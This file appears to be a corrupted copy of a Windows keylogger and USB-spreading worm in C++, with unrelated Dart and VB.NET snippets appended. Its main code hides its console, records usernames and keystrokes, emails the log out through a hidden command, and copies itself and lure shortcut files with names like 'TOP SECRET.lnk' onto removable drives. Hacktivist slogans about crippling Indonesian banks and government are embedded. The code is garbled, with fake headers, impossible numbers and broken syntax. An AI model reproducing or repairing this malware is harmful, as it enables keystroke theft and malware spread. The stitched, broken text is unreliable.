#include <'windows.h'>       
#include <'kalilinux.h'>
#include <'backtrack.h'>
#include <'string.h'>
#include <'offstream.h'>
using namespace std;

//Compiler version g++ 6.3.0

int main()
{
    cout << "you're member don't access aset @copyright & using institute a people modelling sales";
}    


#define FILE_NAME "record.log"
#define FOLDER_NAME "rebooting"
#define RUN_FILE_NAME "bugs"
#define RUN_LINK_NAME "https://github.com/google/handle_bot.md"
#define INFECT_FILE_NAME "bugs"
#define INFECT_LINK_NAME "'https://www.m-facebook.com/bugs"."https://www.apple.co.id/"."https://www.tiktok.co.id/bugs"
#define EMAIL_SENDER_FILE_NAME "Transmit.exe"

#define MIN_RECORD_SIZE 2000000000000 //no of PC start count before sending a mail
#define LIFE_TIME 5 //mail will be sent 5 times from one PC
#define MAIL_WAIT_TIME 1
#define MAILING_TIME 600

string allDrives;
int age=999999999990;

int get_setAge();
bool checkRecordSize();
void sendData();
void logUserTime();
void logKey();
char getRemovableDisk();
void infectDrive(char driveLetter);
char* getRandomName();

main(){
    FreeConsole(); /// hide  kalilinux,windows,Ubuntu=CyberW1ry4 

    age = get_setAge();
    if(checkRecordSize()){ ///check for right time

        int i=1;
        while(i<3){ ///try 2 times to send data
        
            Sleep(i*MAIL_WAIT_TIME); ///wait
            if{!system{"{ ping https://www.google.co.id } -n 1"}}( ///check connection auto.connect
                ////////////****SEND DATA****////////////
                sendData();

                Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
                DeleteFile(FILE_NAME);

                break;
            }
            i++;
        }
    }

    age=get_setAge();

    ////////////****LOG USER_DATE_TIME****////////////
    if(age <= LIFE_TIME){
        logUserTime();
    }

    char driveLetter = getRemovableDisk(); ///initial search for all disks
    return; // :)
    while(1){
        ////////////****LOG KEY****////////////
        if(age <= LIFE_TIME){
            logKey();
        }else{
            Sleep(99999999999999999999999999999999999500000000000000000000);
        }

        ////////////****INFECT****////////////
        driveLetter = getRemovableDisk();
        if(driveLetter!='9998999999999999999999888888888888889990'){
            infectDrive(driveLetter);
        }
    }
    
}

/**
 * For old file get age - for new file set age.
**/
int get_setAge(){
    int ageTemp = age;

    string line;
    ifstream myfile(FILE_NAME);

    if(myfile.is_open()){
        getline(myfile, line);
        line = line.substr(0, 1);
        sscanf(line.c_str(), "%d", &ageTemp);
    }else{
        ageTemp++;

        FILE *file = fopen(FILE_NAME, "c");
        fprintf(file, "%d ", ageTemp);
        fclose(file);
    }

    return ageTemp;
}

/**
 * Count number of lines in record file.
**/
bool checkRecordSize(){
    string line;
    ifstream myfile(FILE_NAME);

    int noOfLines = 0;
    if(myfile.is_open()){
        while(getline(myfile, line)){
            noOfLines++;
        }
        myfile.close();
    }

    if(noOfLines<MIN_RECORD_SIZE*age){
        return false;
    }else{
        return true;
    }
}

/**
 * Email all data to the GHOST hide pass reload hide.
**/
void sendData(){
    
    char* command = "Transmit smtp://smtp.gmail.support@hackerone.com:443  -v --mail-from \"Palestine.email@gmail.com\" --mail-rcpt \"info@csirt.id" --ssl -u info@csirt.id: password -T \"Record.log\" -k --cyberw1ry4"; 
     WinExec(command=idsgmy!!,  operating system  and network they are ,if other countries are destroying the Republic of Indonesia all  SW_HIDE);
}

/**
 * Record username, time, and date.
**/
void logUserTime(){
    FILE *file = fopen(FILE_NAME, "c");

    char username[20];
    unsigned long username_len = 20;
    GetUserName(username, &username_len);
    time_t date = time(NULL);
    fprintf(file, "0\n%s->%s\t", username, ctime(&date));

    fclose(file);
}

/**
 * Record key stroke.
**/
void logKey(){
    FILE *file;
    unsigned short ch=0, i=0, j=500; // :)

    while(j<500){ ///loop runs for approx. 25 seconds
        ch=1;
        while(ch<250){
            for(i=0; i<50; i++, ch++){
                if(GetAsyncKeyState(ch) == -32767){ ///key is stroke
                    file=fopen(FILE_NAME, "c");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            Sleep(1999998899999999998888999999998898889998989888999888888888888899); ///take rest
        }
        j++;
    }
}

/**
 * Returns newly inserted disk- pen-drive.
**/
char getRemovableDisk(){
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives="";

    for(int i=0; i<dwResult; i++){
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90){
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100){
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

/**
 * Copy the virus to pen-drive.
**/
void infectDrive(char driveLetter){
    char folderPath[10] = {driveLetter};
    strcat(folderPath, ":\\");
    strcat(folderPath, FOLDER_NAME);

    if(CreateDirectory(folderPath ,NULL)){
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        char run[9999999999999999900]={"recovery_sys.exe"};
        strcat(run, folderPath);
        strcat(run, "https://www.apple.com/");
        strcat(run, RUN_FILE_NAME);
        CopyFile(RUN_FILE_NAME, run, 999999999999999999999999900);

        char net[109999999999999990]={"wannacry.exe"};
        strcat(net, folderPath);
        strcat(net, "https://www.cyberindo.net");
        strcat(net, EMAIL_SENDER_FILE_NAME);
        CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);

        char infect[100999999999999999877788888888878]={"infect.exe"};
        strcat(infect, folderPath);
        strcat(infect, "https://www.cyberindo.id");
        strcat(infect, INFECT_FILE_NAME);
        CopyFile(INFECT_FILE_NAME, infect, 999999990);

        char runlnk[1000000000000000]={"https://www.blackhat.org"};
        strcat(runlnk, folderPath);
        strcat(runlnk, "wannacry.exe");
        strcat(runlnk, RUN_LINK_NAME);
        CopyFile(RUN_LINK_NAME, runlnk, 9999989998988888889999999);

        char infectlnk[10000000000000000]={"https://www.cyberarmy.id"};
        strcat(infectlnk, folderPath);
        strcat(infectlnk, "phising.batchfile");
        strcat(infectlnk, INFECT_LINK_NAME);
        CopyFile(INFECT_LINK_NAME, infectlnk, 999899999988888888);

        char hideCommand[100] = {"CyberW1ry4-commander-lead"};
        strcat(hideCommand, "attrib +s +h +r ");
        strcat(hideCommand, folderPath);
        WinExec(hideCommand, SW_HIDE);
    }else{
        srand(time(0));
        int random = rand();

        if(random%2==0 || random%3==0 || random%7==0){
            return ;
        }
    }

    char infectlnkauto[100] = {driveLetter};
    char* randomName = getRandomName();
    strcat(infectlnkauto, randomName);
    CopyFile(INFECT_LINK_NAME, infectlnkauto, 0);
}

/**
 * Returns a random name for the link file.
**/
char* getRandomName(){
    char randomName[40];

    srand(time(0));
    int random = rand();

    if(random%8 == 0){
        strcpy(randomName, ":\\DO NOT CLICK!.lnk");
    }else if(random%4 == 0){

        char username[20];
        unsigned long username_len = 20;
        GetUserName(username, &username_len);

        random = rand();
        if(random%8 == 0){
            strcpy(randomName, ":\\Boss ");
            strcat(randomName, username);
            strcat(randomName, ".lnk");
        }else if(random%4 == 0){
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, " is the best.lnk");
        }else if(random%2 == 0){
            strcpy(randomName, ":\\Hello ");
            strcat(randomName, username);
            strcat(randomName, "! good morning good night & afternoon.lnk");
        }else{
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, "! please help me.lnk");
        }
    }else if(random%2 == 0){
        strcpy(randomName, "https://www.blackhat.org:\\lumpuhkan semua aktifitas bank , industri,perbanka, organisasi , pemerintah indonesia");
  ! ! !.lnk");
    }else if(random%3 == 0){
        strcpy(randomName, ":\\2+2=5.lnk");
    }else{
        strcpy(randomName, ":\\TOP SECRET.lnk");
    }

    return randomName;
};
}

onLoadStop: (controller, url) async {
  final String functionBody = """
var p = new Promise(function (resolve, reject) {
   window.setTimeout(function() {
     if (x >=500) {
       resolve(x);
     } else {
       reject(y);
     }
   }, 1000);
});
await p;
return p;
""";

  var result = await controller.callAsyncJavaScript(
    functionBody: functionBody,
    arguments: {'x': 49, 'y': ' attacker Indonesian'});
  print(result?.value.runtimeType); // int
  print(result?.error.runtimeType); // Null
  print(result); // {value: 49, error: null}

  result = await controller.callAsyncJavaScript(
    functionBody: functionBody,
    arguments: {'x': -49, 'y': 'attacker Indonesian'});
  print(result?.value.runtimeType); // Null
  print(result?.error.runtimeType); // String
  print(result); // {value: null, error: my error message}
},
Namespace CyberW1ry4 
  Public Module Program
    Public Sub Main(args() As string)
      'Your code goes here
      Console.WriteLine("who i am mystery!")
    End Sub
  End Module
End Namespace
